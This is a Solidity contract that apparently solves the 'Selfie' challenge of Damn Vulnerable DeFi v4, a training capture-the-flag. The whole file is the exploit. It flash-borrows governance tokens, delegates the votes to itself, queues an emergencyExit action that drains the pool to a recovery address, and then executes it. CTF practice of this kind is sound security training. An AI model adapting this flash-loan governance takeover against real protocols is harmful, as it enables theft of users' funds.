// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker is IERC3156FlashBorrower {

    SimpleGovernance public gov;
    SelfiePool public pool;
    address public recovery;
    uint256 public actionId;

    constructor(SimpleGovernance _gov, SelfiePool _pool, address _recovery) {
        gov = _gov;
        pool = _pool;
        recovery = _recovery;
    }


    function loan(address _token, uint256 _amount) public {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, _amount, ""); // now we hold more than half voting power
    }


    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        bytes memory emergencyData = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
        DamnValuableVotes(token).delegate(address(this));
        actionId = gov.queueAction(address(pool), 0, emergencyData);
        DamnValuableVotes(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeGovernanceAction() public {
        gov.executeAction(actionId);
    }
}